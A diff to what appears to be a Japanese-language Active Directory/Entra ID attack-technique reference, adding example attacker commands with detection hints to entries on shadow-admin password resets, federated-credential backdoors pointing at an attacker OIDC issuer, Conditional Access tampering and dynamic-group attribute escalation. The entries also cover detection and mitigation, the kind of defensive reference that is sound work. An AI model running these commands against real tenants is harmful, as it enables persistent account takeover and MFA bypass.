+        "q": "Set-MsolUserPassword -UserPrincipalName shadowadmin@corp.onmicrosoft.com -NewPassword 'Passw0rd!' -ForceChangePassword $false"
+      },
+      {
+        "tool": "AzureAD",
+        "t": "提供終了予定のAzureADモジュール経由のリセット。廃止後の実行は攻撃者が古いランブックを使い回している兆候",
+        "q": "Set-AzureADUserPassword -ObjectId <objectId> -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "AD同期APIを直接叩いてパスワードを設定。通常のGraph/MSOnline操作ログを経由しない低ノイズ経路",
+        "q": "Set-AADIntUserPassword -UserPrincipalName shadowadmin@corp.onmicrosoft.com -Password 'Passw0rd!'"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "同期スコープ内の標的候補を列挙する偵察。単体ではGraphの`List users`として正規運用と紛れやすい",
+        "q": "Get-MgUser -Filter \"onPremisesSyncEnabled eq true\" -Property onPremisesSyncEnabled,onPremisesImmutableId,userPrincipalName -All"
+      }
+    ],
     "detect": "オンプレDCのセキュリティログで、Entra ConnectのAD DS同期/コネクタアカウント(MSOL_xxxx / ADSync / AAD_xxxx)を実行主体(Subject)とするパスワードリセット4724を監視し、対象(Target)が機微/特権アカウントである、または短時間に複数対象へ及ぶ異常を検出する。Entra側の監査ログ(AuditLogs, Category=UserManagement)で管理者リセット/SSPRの操作を、実行者ロール(Helpdesk/Password Admin等の低位ロール)と、対象がオンプレ由来の同期・特権ユーザである点で相関する。クラウドでのリセット直後(数分内)に、同一プリンシパルへのオンプレ4724 → 当該アカウントの初回/異常なログオン(4768/4624)が連鎖するかを、クラウド監査とオンプレSecurityEventを時系列でジョインして突き合わせるのが本技法固有の勘所(単方向の4724やクラウド単独リセットだけでは判別しづらい)。",
     "events": "オンプレ: 4724(パスワードリセット試行 — 実行者=同期コネクタアカウントである点が鍵。管理者起点のリセットは常に4724でありSubjectは対象本人ではないコネクタ), 4738(ユーザ属性変更/pwdLastSet更新), 4723(パスワード変更 — 本人による自己変更フロー時), 直後の4768(TGT要求)/4624(シャドウ管理者ログオン, Type3/10)。クラウド: Entra AuditLogs(OperationName=Reset password (by admin) / Reset user password / Reset password (self-service)、Category=UserManagement), SigninLogs(実行者ロール/場所), Entra Connect Health のパスワードライトバック関連イベント。",
     "mitigate": "パスワードリセット可能なクラウドロール(Helpdesk/Password/Authentication/User Administrator, Global Admin)を最小化し、PIM(Just-in-Time+承認)とフィッシング耐性MFAで保護する。シャドウ管理者を解消: オンプレの危険なACL(GenericAll/WriteDACL等)や過剰なローカル管理者・DCSync権を棚卸しし、実効特権を持つアカウントはAdminSDHolder保護(adminCount)下に置くか、ディレクトリ同期/SSPR/ライトバックのスコープから除外する。パスワードライトバックが業務上不要なら無効化し、必要ならAD DSコネクタアカウントのReset Password/Change Password委任を対象OUに厳密に限定する。Entra Connectサーバをティア0資産として隔離し、コネクタアカウントによる4724・AuditLogsのリセット操作をSIEMで常時監視・アラート化する。",
@@ -11302,6 +18384,33 @@ AD.I18N.ja.attacks = [
     "summary": "攻撃者がアプリ登録(Applicationオブジェクト)やユーザー割当マネージドID(UAMI)に federatedIdentityCredentials を追加し、issuer/subject を攻撃者が支配するOIDC IdPへ向けることで、そのIdPが発行したJWTを client_credentials+フェデレーテッドアサーションフローで提示するだけで当該プリンシパル(SP/UAMI)としてアクセストークンを取得する、保存シークレット不要のバックドア。クライアントシークレット・証明書に次ぐ第3の“秘密なし”認証経路であり、Workload Identity Federation(BYOIDP)の正規機能を悪用する。addPassword/addKey を一切発火させず federatedIdentityCredential 系イベントのみを残すためシークレット追加より静かで、UAMIで機能する唯一の資格情報型でもある(UAMIはシークレット/証明書を追加できずFICのみ)。",
     "how": "前提権限は2系統。(A) アプリ経路: 対象アプリ登録(Applicationオブジェクト)の所有者(owner)、または Application Administrator / Cloud Application Administrator / Global Administrator、あるいは microsoft.directory/applications/credentials/update を含むロール(Graph権限としては Application.ReadWrite.All / Directory.ReadWrite.All 相当)。(B) UAMI経路: 対象のユーザー割当マネージドIDへのAzure RBAC書込 — Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write(Managed Identity Contributor / Contributor 等)。手順: (1) 攻撃者は自前のOIDC発行者(Issuer)を用意する — ROADtoolsの roadoidc がOIDCディスカバリ文書(/.well-known/openid-configuration)とJWKS、および任意の iss/sub/aud を持つ署名済みJWTを提供する(鍵は攻撃者所有で、EntraがHTTPで到達できる場所にホストするだけでよい)。(2) 標的プリンシパルに federatedIdentityCredentials オブジェクトを追加し、issuer=攻撃者のOIDC URL、subject=攻撃者JWTのsub、audience=api://AzureADTokenExchange(Microsoftの規定値。攻撃者はIdPとFICの双方を支配するため実際には任意文字列でも整合可)を設定する。アプリには Microsoft Graph POST /applications/{id}/federatedIdentityCredentials、New-MgApplicationFederatedIdentityCredential、az ad app federated-credential create を、UAMIには az identity federated-credential create / ARM PUT を用いる。(3) 攻撃者IdPが発行したJWTを、client_credentials+フェデレーテッドアサーション(client_assertion)フローでEntraのトークンエンドポイント(POST login.microsoftonline.com/{tenant}/oauth2/v2.0/token、grant_type=client_credentials、client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer、client_assertion=<攻撃者JWT>、scope=...default)へ提示する。(4) EntraはFICの issuer/subject/audience に従い攻撃者JWKSを取得してJWTを検証し、そのプリンシパル(SP/UAMI)としてアクセストークンを発行する — 保存されたシークレット/証明書は一切不要で、以後どこからでもトークンを鋳造できる。重要な区別として、FICは enterprise-app の servicePrincipal オブジェクトへ直接付与するのではなくアプリ登録では Application オブジェクトへ設定し、“SPとして”のトークンは当該アプリのFIC経由で得る点、UAMIではARM経由で設定されEntra上はUAMIのSP表現に紐づく点、そしてUAMIで機能する唯一の資格情報型である点が本技法固有。addPassword/addKey を一切発火させず federatedIdentityCredential 系イベントのみを残すためシークレット追加より静かで、パスワードリセットやシークレット失効の影響も受けず恒久的に持続する。一次情報は dirkjanm.io(roadoidc による本技法)、UAMI観点は Thomas Naunheim(cloud-architekt.net)のフェデレーテッド資格情報悪用・検知記事。",
     "tools": "ROADtools roadoidc (攻撃者OIDC発行者), ROADtools roadrecon (アプリ/権限列挙), Microsoft Graph PowerShell (New-MgApplicationFederatedIdentityCredential), Azure CLI (az ad app federated-credential create / az identity federated-credential create), Microsoft Graph API (POST /applications/{id}/federatedIdentityCredentials), Azure ARM/REST (UAMI federatedIdentityCredentials PUT), AzureHound",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "アプリ登録に攻撃者IdPを指すFICを追加。addPassword/addKeyを発火させずこのイベントのみが証跡になる",
+        "q": "New-MgApplicationFederatedIdentityCredential -ApplicationId <appObjId> -Name 'sync' -Issuer 'https://attacker-idp.example.com' -Subject 'attacker-sub' -Audiences 'api://AzureADTokenExchange'"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "az cliから同じFICを追加。`Add federated identity credential`監査イベントのみが唯一だが確実な痕跡",
+        "q": "az ad app federated-credential create --id <appId> --parameters '{\"name\":\"sync\",\"issuer\":\"https://attacker-idp.example.com\",\"subject\":\"attacker-sub\",\"audiences\":[\"api://AzureADTokenExchange\"]}'"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "UAMIはシークレット/証明書を追加できずFICのみが有効な資格情報型。`federatedIdentityCredentials/write`が識別鍵",
+        "q": "az identity federated-credential create --name backdoor --identity-name corp-uami --resource-group corp-rg --issuer https://attacker-idp.example.com --subject attacker-sub --audiences api://AzureADTokenExchange"
+      },
+      {
+        "tool": "ROADtools",
+        "t": "攻撃者側でOIDCディスカバリ文書とJWKSをホストする発行者を用意。Entra側にログは残らずFICのissuer/subjectのみが手掛かり",
+        "q": "roadoidc --port 443 --cert cert.pem --key key.pem"
+      },
+      {
+        "tool": "Graph API",
+        "t": "Graph REST直叩き。SDKを介さずトークン持参で呼べるため監査ログの`Add federated identity credential`だけが頼り",
+        "q": "Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/applications/<appObjId>/federatedIdentityCredentials' -Body '{\"name\":\"sync\",\"issuer\":\"https://attacker-idp.example.com\",\"subject\":\"attacker-sub\",\"audiences\":[\"api://AzureADTokenExchange\"]}'"
+      }
+    ],
     "detect": "主信号はEntraディレクトリ監査ログ(AuditLogs)のアプリ更新オペレーション(\"Update application\")で、modifiedProperties に federatedIdentityCredentials(issuer/subject/audience)の追加/変更が現れるもの(Elastic の \"Entra ID Federated Identity Credential Issuer Modified\" ルールに相当)。UAMIではAzure Activity(AzureActivity)の Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write が主信号。重要な識別点として本技法は addPassword/addKey(Add service principal credentials)を一切発火させないため、シークレット/証明書追加に焦点を当てた既存検知では取りこぼす — FIC追加イベントそのものを監視する必要がある。相関すべき二次信号は直後に発生する当該プリンシパルのフェデレーテッドアサーション由来サインインだが、記録先テーブルがアプリ登録とUAMIで異なる点に注意: (a) アプリ登録のFICサインインは AADServicePrincipalSignInLogs に記録され、FederatedCredentialId 列が値を持つ(=FIC由来を確定できる決定的シグナル。保存シークレット由来の ServicePrincipalCredentialKeyId / ServicePrincipalCredentialThumbprint は空)。(b) UAMIのFICサインインは AADManagedIdentitySignInLogs に記録されるがFIC識別子の列は存在しないため、トークンの uti(UniqueTokenIdentifier)で AzureActivity と相関させる(Naunheim)。いずれも外部/異常IPからの成功が疑わしい。判定の核心は issuer 値のベースライン化 — 正規のWIF発行者(token.actions.githubusercontent.com のような GitHub Actions、AKS/KubernetesのOIDC発行者、Terraform Cloud、信頼済みパートナーテナント)に対し、未知/攻撃者由来の issuer が決定的な悪性シグナル。クラウド操作はWindowsセキュリティイベント(数値EventID)を発火せず、ホスト側は攻撃者端末での az / Graph PowerShell / roadoidc 実行(4104/4688/EDRプロセス)と graph.microsoft.com・management.azure.com・login.microsoftonline.com への通信のみが手掛かり。参考: Thomas Naunheim のUAMIフェデレーテッド資格情報悪用・検知記事(cloud-architekt.net)、dirkjanm.io(roadoidc による本技法の一次情報)、Elastic Security 検知ルール。",
     "events": "Entra Audit(AuditLogs OperationName): Update application(federatedIdentityCredentials の追加/変更。modifiedProperties に issuer/subject/audience が出現); Azure Activity(AzureActivity OperationNameValue): MICROSOFT.MANAGEDIDENTITY/USERASSIGNEDIDENTITIES/FEDERATEDIDENTITYCREDENTIALS/WRITE(UAMIへのFIC追加); AADServicePrincipalSignInLogs(アプリ登録のFIC由来SPサインイン。FederatedCredentialId が値を持ち、ServicePrincipalCredentialKeyId/ServicePrincipalCredentialThumbprint は空); AADManagedIdentitySignInLogs(UAMIのFIC由来サインイン。FIC識別子列は無く、uti/UniqueTokenIdentifier で AzureActivity と相関); (操作端末のみ) 4104/4103(PowerShellスクリプトブロック/モジュール), 4688(az.exe/pwsh.exe/python.exe) ※クラウドFIC追加・トークン鋳造自体はWindowsの数値EventIDを発火せず、addPassword/addKey も本技法では発火しない点に注意。",
     "mitigate": "(1) アプリ資格情報を書ける主体(owner, Application/Cloud Application Administrator, microsoft.directory/applications/credentials/update)を最小化しPIMで時間制限付き昇格に。UAMIは Azure RBAC の Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write を持つ割当(Managed Identity Contributor/Contributor/カスタムロール)を最小権限で棚卸し。(2) アプリのFIC追加(Entra Audit \"Update application\" の federatedIdentityCredentials 変更)とUAMIのFIC追加(Azure Activity write)に即時アラートを設定し、未承認 issuer は即インシデント化。(3) 承認済みWIF発行者+subjectのallowlist/ベースライン(GitHubのorg/repo、AKSクラスタ、Terraform Cloud、パートナーテナント)を維持し範囲外 issuer を検知。(4) Graph/ARMで全アプリ・全UAMIの federatedIdentityCredentials を定期棚卸しし差分照合(ステルス追加の継続検知)。(5) ワークロードID向けConditional Access(Workload Identities Premium)でSPサインインを既知IP範囲に制限しリスク検知を有効化。(6) 危険な高権限を持つ放置アプリ/所有者を棚卸し・削減し、シークレット/証明書だけでなくFICも“第3の資格情報”として同等に監査対象化する。",
@@ -11352,6 +18461,33 @@ AD.I18N.ja.attacks = [
     "summary": "条件付きアクセス(CA)はEntraにおけるMFA/デバイス/場所コントロールの主要な強制ポイント。CA編集ロール(最小はConditional Access Administrator、他にSecurity Administrator/Global Administrator)を得た攻撃者が、(A)自分のアカウント/グループをMFA必須ポリシーの除外(excludeUsers/excludeGroups)に追加する、(B)攻撃インフラを「信頼された場所(named location, isTrusted=true)」として登録する、あるいは(C)2026年Reversec研究の隠し「time」条件——Entra管理センター・What-Ifツール・Microsoft Graph(v1.0とbeta双方)・Microsoft.Entra PowerShellのいずれにも描画されず、内部のIbiza/IAM API(main.iam.ad.ext.azure.com)経由でのみ作成・可視化される時間ベース条件——を注入し、ポリシーを特定スケジュールで静かにfail openさせる。資格情報の窃取や新デバイス登録とは別種の、認証強制ロジックそのものを書き換える耐久性あるMFAバイパス。重要な訂正: 隠しtime条件の検知の空白はUI/Graph側であって監査ログではない——CA変更(隠しtime条件を含む)は必ずEntra監査ログ(AuditLogs \"Update conditional access policy\" のmodifiedProperties)に記録される。Microsoftはこれを脆弱性ではなくprivate previewの正規time機能と位置付け(CA Admin限定・監査ログ記録を根拠に)修正を見送っている。したがって検知の核はポータル/Graph出力ではなくAuditLogsにある。",
     "how": "前提権限: CAを編集できる最小ロールはConditional Access Administrator(他にSecurity Administrator/Global Administrator)。攻撃者は先行のロール奪取・トークン窃取・SP資格情報追加でこの権限を得ている。手法A(除外追加): MFAやデバイス準拠を要求する既存ポリシーの conditions.users.excludeUsers / excludeGroups に自分のprincipalまたは攻撃者制御グループを追加し、そのアカウントだけがMFAを免れる。Graph: PATCH https://graph.microsoft.com/v1.0(or beta)/identity/conditionalAccess/policies/{id}、または Update-MgIdentityConditionalAccessPolicy。手法B(信頼された場所偽装): POST /identity/conditionalAccess/namedLocations で攻撃者のVPS/住宅プロキシIPレンジを ipNamedLocation として作成し isTrusted=true に設定、「信頼された場所を除外」または「信頼された場所ならMFA不要」の設計を悪用してそのIPからのサインインを強制対象外にする(New-MgIdentityConditionalAccessNamedLocation)。手法C(隠しtime条件, 2026 Reversec研究)【要訂正】: この条件はGraphではなく内部の Ibiza/IAM API(main.iam.ad.ext.azure.com)経由でポリシーの conditions 配下に `time` として書き込む(timezoneId, dateRange の startDateTime/endDateTime, daysOfWeek, TimeRanges 等)。書き込まれた time 条件は Entra管理センター・What-Ifツール・Microsoft Graph(v1.0とbeta双方が同一のサニタイズ済みポリシーを返す)・Microsoft.Entra/Entra Beta PowerShell のいずれにも描画されない(ポータルが「3条件アクティブ」と表示しつつ2条件しか見せない不整合が唯一のUI兆候)。結果、ポリシーは指定スケジュール(例:深夜帯)にだけ静かにfail openし、UIでは「MFA必須/ブロック」に見えるのに実際は評価されない。ただしこの変更もCA監査ログには \"Update conditional access policy\" として必ず記録される(modifiedProperties に time/TimeRanges 文字列)ため、検知の空白はUI/Graph側であって監査ログではない。Microsoftはこれを脆弱性ではなくprivate previewの正規time機能と位置付け修正を見送っている。亜種: grantControls を mfa→組込みコントロール無しへ弱める、state を enabledForReportingButNotEnforced(report-only)へ降格させる。中核プリミティブ: 認証強制ロジック自体を改変するため、資格情報を盗む必要も新デバイスを登録する必要もなく、正規サインインがMFAなしで通る恒久バックドアとなる。実行の大半は攻撃者ホストのPowerShell/az/PythonからGraph API(手法A/B)またはIbiza API(手法C)経由で行われ、オンプレADドメイン内には痕跡を残さない。",
     "tools": "Microsoft Graph PowerShell (Update-MgIdentityConditionalAccessPolicy, New-MgIdentityConditionalAccessNamedLocation), Microsoft Graph API (v1.0/beta /identity/conditionalAccess/policies・/namedLocations — 手法A/B), Ibiza/IAM内部API (main.iam.ad.ext.azure.com — 手法Cの隠しtime条件の作成・可視化に使用; Graph v1.0/betaには現れない), Azure CLI, AzureADPreview (Set-AzureADMSConditionalAccessPolicy), Microsoft.Entra/Entra Beta PowerShell (Get-EntraBetaConditionalAccessPolicy — preview policyでエラーを返しtime条件を出さない), AADInternals, GraphRunner, ROADtools (roadrecon), Entra 管理センター, Microsoft365DSC(監査/悪用両用)",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "MFA必須ポリシーのexcludeUsersに自アカウントを追加。監査ログの`Update conditional access policy`のexcludeUsers差分が残る",
+        "q": "Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId <policyId> -BodyParameter @{ Conditions = @{ Users = @{ ExcludeUsers = @('<attackerObjectId>') } } }"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "攻撃者IPレンジを信頼済み場所として登録。`Add named location`監査イベントとIsTrusted=trueの組み合わせが識別鍵",
+        "q": "New-MgIdentityConditionalAccessNamedLocation -BodyParameter @{ '@odata.type'='#microsoft.graph.ipNamedLocation'; DisplayName='HQ-VPN'; IsTrusted=$true; IpRanges=@(@{ '@odata.type'='#microsoft.graph.iPv4CidrRange'; CidrAddress='203.0.113.0/24' }) }"
+      },
+      {
+        "tool": "Graph API",
+        "t": "beta版エンドポイントでの直接改ざん。v1.0/betaいずれ経由でも`Update conditional access policy`監査ログは共通して記録される",
+        "q": "Invoke-MgGraphRequest -Method PATCH -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies/<policyId>' -Body '{\"conditions\":{\"users\":{\"excludeGroups\":[\"<attackerGroupId>\"]}}}'"
+      },
+      {
+        "tool": "Entra Admin Center",
+        "t": "隠しtime条件はGraph/UIに一切描画されずこの内部APIでのみ作成・可視化される。検知は監査ログのmodifiedProperties内`time`文字列が頼り",
+        "q": "PATCH https://main.iam.ad.ext.azure.com/api/Policies/<policyId>"
+      },
+      {
+        "tool": "AzureADPreview",
+        "t": "廃止予定モジュールでstateをreport-onlyへ降格させ実質無効化。実行環境の古さも兆候になる",
+        "q": "Set-AzureADMSConditionalAccessPolicy -PolicyId <policyId> -State 'enabledForReportingButNotEnforced'"
+      }
+    ],
     "detect": "主戦場はEntra監査ログ(クラウド)であり、隠しtime条件を含む全変種の権威情報源はAuditLogsである(UI/Graphではない)。OperationName「Add/Update/Delete conditional access policy」「Add/Update named location」(Category=Policy, LoggedByService=\"Conditional Access\")のTargetResources.modifiedPropertiesを差分解析し、excludeUsers/excludeGroupsへの追加、GrantControls/BuiltInControlsからのmfa削除、stateのreport-only降格、namedLocationのisTrusted=true化とIPレンジ追加、隠しtime条件(modifiedProperties内の time/TimeRanges)を検出する。【訂正】隠しtime条件はEntraポータル・What-Ifツール・Microsoft Graph(v1.0とbeta双方)・Microsoft.Entra PowerShellのいずれにも描画されないため、Graphによる構成エクスポート差分では捕捉できない(betaでもサニタイズされる)。条件の完全な可視化が必要なら内部Ibiza API(main.iam.ad.ext.azure.com)でポリシーを読み出しベースライン比較する。ただし『変更が起きた』検知はAuditLogsの当該Update/Addイベントで十分(Microsoft自身の検知根拠)。SigninLogs側では、本来カバーされるユーザー/アプリでConditionalAccessStatusが特定時間帯だけnotApplied/notEnabledになる、またはAuthenticationRequirement=singleFactorAuthenticationで成功するパターンを監視する。ポータルで「アクティブ条件数>可視条件数」の不整合も兆候。開始者(InitiatedBy)・送信元IP・変更管理チケットの有無で正規/不正を切り分ける。MDE/MDIはホスト兆候の補助であり、クラウド監査ログが権威情報源。",
     "events": "Entra AuditLogs: 'Add conditional access policy' / 'Update conditional access policy' / 'Delete conditional access policy' / 'Add named location' / 'Update named location'(Category=Policy, LoggedByService=\"Conditional Access\"; TargetResources.modifiedPropertiesに旧値/新値のJSON。隠しtime条件も time/TimeRanges 文字列として記録される), SigninLogs(ConditionalAccessPolicies[].result=notApplied/notEnabled, ConditionalAccessStatus, AuthenticationRequirement=singleFactorAuthentication), (攻撃/管理ホストがMDEオンボード時のみ)4688・4104(Update-MgIdentityConditionalAccessPolicy等の実行) ※CA変更・隠しtime条件注入自体はWindows Event IDを発火しない(クラウドイベント)。隠しtime条件はEntraポータル/What-Ifツール/Microsoft Graph(v1.0・beta双方)には描画されず、監査ログにのみ現れる点に注意。",
     "mitigate": "Conditional Access Administrator/Security Administrator/Global Administratorの割り当てを最小化しPIM/JIT+承認フローで昇格を制御。すべてのCAポリシーおよび名前付き場所の変更(Add/Update/Delete)に即時アラートを設定——これは隠しtime条件を含む全変種を捕捉できる唯一かつ権威的な検知点である(Microsoftの公式見解も監査ログ可視性を根拠にtime機能を許容)。【訂正】CA構成をGraph(v1.0/beta)で定期エクスポートしても隠しtime条件はサニタイズされ現れないため、time条件の構成差分監視には内部Ibiza API(main.iam.ad.ext.azure.com)読み出しが必要——通常運用ではAuditLogsの変更イベント監視を主とする。Microsoft365DSC/ConditionalAccessバックアップでバージョン管理(ただしtime条件は取得できない前提)。名前付き場所のisTrustedフリップとIPレンジ追加を監視。文書化されたbreak-glass(緊急アクセス)アカウント以外の除外追加を禁止・警告する。Policy.ReadWrite.ConditionalAccess権限を持つサービスプリンシパル/ユーザーを棚卸し。変更はreport-only→承認→本番の変更管理を必須化し、除外リストと信頼された場所を定期レビューする。",
@@ -11397,6 +18533,33 @@ AD.I18N.ja.attacks = [
     "summary": "Entra ID の動的グループ(Dynamic membership)は利用者属性から規則ベースでメンバーを自動生成し、手動でのメンバー追加/削除はできない(メンバー変化は必ず属性評価に由来)。特権を付与する動的グループ—Azure RBAC ロール(サブスク/リソースの Owner/Contributor 等)の割当先、アプリロール割当・エンタープライズアプリアクセス、SharePoint/Teams/Exchange 等のリソースアクセス、Conditional Access の除外(MFA バイパス)、アクセスパッケージ自動割当、グループ所有権を介したアプリ/SP 管理—の membershipRule が書込可能な属性をキーにしている場合、攻撃者は制御下のプリンシパルにその属性を書き込むだけで規則へ合致させ、自動再評価により承認なしで特権グループへ参加できる。重要な事実訂正: 動的グループはロール割当可能グループ(isAssignableToRole=true)にできない(Microsoft 仕様上 role-assignable は assigned メンバーシップ必須で、動的メンバーシップは非対応)。したがってこの経路で Entra ディレクトリロールを直接取得することはできず、到達できるのは Azure RBAC/アプリ/リソース/CA の各特権である。Global Admin 等への到達は本経路単独では不可で、掌握したアプリ/SP が高権限 Graph アプリロールを持つ等のさらなる連鎖を要する。もう一つの訂正: department/jobTitle/city/extensionAttribute 等は既定ではエンドユーザー(メンバー/ゲスト)が自プロフィール編集できない。書込にはディレクトリ書込権限を持つロール(User Administrator 等)やアプリ/SP(User.ReadWrite.All/Directory.ReadWrite.All)、またはオンプレ AD 側の SELF 書込(同期で Entra へ反映)が必要。既定で本人編集可能なのは mobile(携帯番号)・写真・パスワード程度で、規則が mobile 等の自己編集可能属性をキーにしている場合のみ純粋なセルフサービス昇格が成立する。CVE ではなく設定不備(書込可能属性を特権付与規則のキーにした)由来の低ノイズ・構成駆動の昇格。",
     "how": "前提: (a) 特権を付与する動的グループが存在する—Azure RBAC ロール(サブスク/リソースの Owner/Contributor 等)割当先、アプリロール割当・エンタープライズアプリアクセス、SharePoint/Teams/Exchange 等リソースアクセス、Conditional Access ポリシーの除外(MFA バイパス)、アクセスパッケージ自動割当、あるいはグループ所有権を介したアプリ/SP 管理。※動的グループは isAssignableToRole=true にできないため Entra ディレクトリロールの直接割当先にはならない。(b) その membershipRule が書込可能な属性(department, jobTitle, employeeType, companyName, city, usageLocation, extensionAttribute1-15, mobile 等)をキーにしていること。(1)偵察: 攻撃者は roadrecon/AzureHound/Graph で各グループの membershipRule を列挙し、user.department -eq \\\"IT\\\" のような規則キー属性と、そのグループに紐づく特権(RBAC ロール割当・appRoleAssignment・CA 除外・リソースアクセス)を特定する。(2)属性書込: 制御下のプリンシパルに一致属性を設定する。書込経路は—(i) User.ReadWrite.All / Directory.ReadWrite.All を持つアプリ/SP のトークンで PATCH /users/{id}、(ii) User Administrator / Groups Administrator / Global Administrator 等のロールを持つ侵害アカウント、(iii) オンプレ AD 側で当該同期属性に SELF 書込権限がある場合は本人が書換え→同期で Entra へ反映(Microsoft も同期属性の SELF 書込を注意喚起)、(iv) 規則キーが既定で自編集可能な属性(mobile 等)ならエンドユーザー本人が直接書換え、(v) ゲストは招待/作成時に属性を設定され得る。具体手段: Update-MgUser -UserId x -Department \\\"IT\\\"、Set-AzureADUser、az rest --method PATCH --url .../users/{id} --body、Graph PATCH /users/{id}。※重要な訂正: 既定ユーザー権限では department/jobTitle/extensionAttribute 等の自プロフィール編集は不可で、Entra ポータルの My Profile からこれらは変更できない(メンバーが自編集できるのは携帯番号・写真・パスワード等に限られ、ゲストは自プロパティ読取のみ+パスワード/携帯)。(3)自動昇格: Entra が動的メンバーシップを非同期のバックグラウンドで再評価(小規模テナントは数分、規模・規則複雑度により最大 24 時間)し、規則合致プリンシパルを人手の承認なしにグループへ自動追加、紐づく RBAC/アプリ/リソース/CA 特権が付与される。(4)成果は到達先次第で Azure RBAC 特権ロール(T1098.003 相当)やアプリ/リソースアクセス、CA 除外による MFA 迂回。Entra Global Admin 等ディレクトリロールへの到達は本経路単独では不可で、掌握したアプリ/SP が保持する高権限 Graph アプリロール等を介した追加連鎖を要する(ゲスト→グローバル管理者の CTF 事例もこの連鎖型)。重要な機序: 動的グループは手動メンバー追加不可=メンバー変化は必ず属性評価に由来する。根本原因は設定不備(書込可能属性を特権付与規則のキーにした)であり脆弱性(CVE)ではない。",
     "tools": "Microsoft Graph PowerShell SDK (Update-MgUser), AzureAD/AzureADPreview (Set-AzureADUser), Azure CLI (az rest --method PATCH /users), AADInternals (Set-AADIntUser), ROADtools (roadrecon), AzureHound, GraphRunner, Microsoft Graph API (PATCH /users/{id}), オンプレ AD 側属性書換(Set-ADUser 等、SELF 書込許可時), Entra 管理ポータル (My Profile: mobile 等の限定属性のみ)",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "動的グループのmembershipRuleキー属性を書換え。Graphの`Update user`監査イベントのdepartment変更が識別鍵",
+        "q": "Update-MgUser -UserId attacker@corp.onmicrosoft.com -Department 'IT'"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "az cliから同じ属性書換え。単体では正規のユーザー更新と区別しづらく再評価後のグループ参加と相関させる",
+        "q": "az rest --method PATCH --url \"https://graph.microsoft.com/v1.0/users/<userId>\" --body '{\"department\":\"IT\"}'"
+      },
+      {
+        "tool": "AzureAD",
+        "t": "廃止予定のAzureADモジュール経由。実行自体が古いツールセットの残存を示唆する",
+        "q": "Set-AzureADUser -ObjectId <userId> -Department 'IT'"
+      },
+      {
+        "tool": "Graph API",
+        "t": "extensionAttributeを直接書換え。単発では正規プロビジョニングと紛れるため動的グループの再評価との相関が要る",
+        "q": "Invoke-MgGraphRequest -Method PATCH -Uri 'https://graph.microsoft.com/v1.0/users/<userId>' -Body '{\"extensionAttribute1\":\"contractor-priv\"}'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "オンプレAD側で同期属性を書換え次回同期でEntraへ反映。オンプレ4738とEntra側再評価タイミングの相関が鍵",
+        "q": "Set-ADUser -Identity attacker -Replace @{department='IT'}"
+      }
+    ],
     "detect": "主戦場は Entra ディレクトリ監査(AuditLogs)。シグナル: (a) 動的規則のキー属性への \\\"Update user\\\"(Category=UserManagement, modifiedProperties に Department/JobTitle/City/EmployeeType/Mobile/extensionAttribute 等)—とくにゲスト(#EXT#)や最近作成/侵害アカウント、アプリ/SP(InitiatedBy.app が非空)による書込、あるいは InitiatedBy.user が Target と同一のセルフサービス編集(規則キーが mobile 等の自編集可能属性の場合)。(b) その属性変更で特権付与動的グループの規則条件が満たされること。重要な注意(検知精度): 動的グループのメンバー変化は手動追加型の \\\"Add member to group\\\"(InitiatedBy 空)として確実には記録されず、実運用では \\\"Update group\\\"(動的評価)として現れることが多い。よって「InitiatedBy が空の Add member to group」を前提にした検知は取りこぼす。決定打は「特権動的グループの規則キー属性が、書込可能なプリンシパルにより制御下アカウント上で書き換えられた」事実と、その後の権限行使の相関である。相関の勘所: 属性書込 → 数分〜数時間後に当該プリンシパルが新特権を行使—Azure RBAC 経路なら AzureActivity(Caller が当該プリンシパル、Microsoft.Authorization/roleAssignments 配下や機微リソース操作)、アプリ/CA 経路なら SigninLogs/EntraIdSignInEvents で新アプリ/MFA バイパスの成立。加えて特権動的グループのメンバー棚卸し(ゲスト/新規アカウントの混入)を定点観測する。Defender XDR の CloudAppEvents(ActionType \\\"Update user.\\\")も属性書込の同信号を運ぶ。EDR(MDE Device*/CrowdStrike)はディレクトリ側の属性書込・再評価を観測しないため、攻撃者端末での Update-MgUser/az rest 実行のみがホスト側の手掛かり(アプリ/SP 経由やオンプレ書換なら痕跡はクラウド/ドメイン側のみ)。",
     "events": "Entra Audit(AuditLogs OperationName): Update user(Category=UserManagement, modifiedProperties に Department/JobTitle/EmployeeType/City/CompanyName/Mobile/extensionAttribute 等=属性操作), Update group(動的評価によるメンバー変化はこの活動として現れることが多い/また membershipRule 改ざん時), Add member to group(手動追加。動的グループでは通常発生しない点に注意=このイベント単体を動的昇格の証跡としない); SigninLogs / EntraIdSignInEvents(昇格後の権限行使・新アプリ/CA 成立の相関); AzureActivity(Microsoft.Authorization/roleAssignments/write, および Caller=当該プリンシパルの特権リソース操作=Azure RBAC 経路の成果); CloudAppEvents ActionType 'Update user.'。※すべてクラウド監査イベントで、対応する Windows Security の数値 EventID は発生しない(オンプレ属性書換で昇格が起点になる場合のみ DC 側 4738=user account changed 等が付随し得る)。",
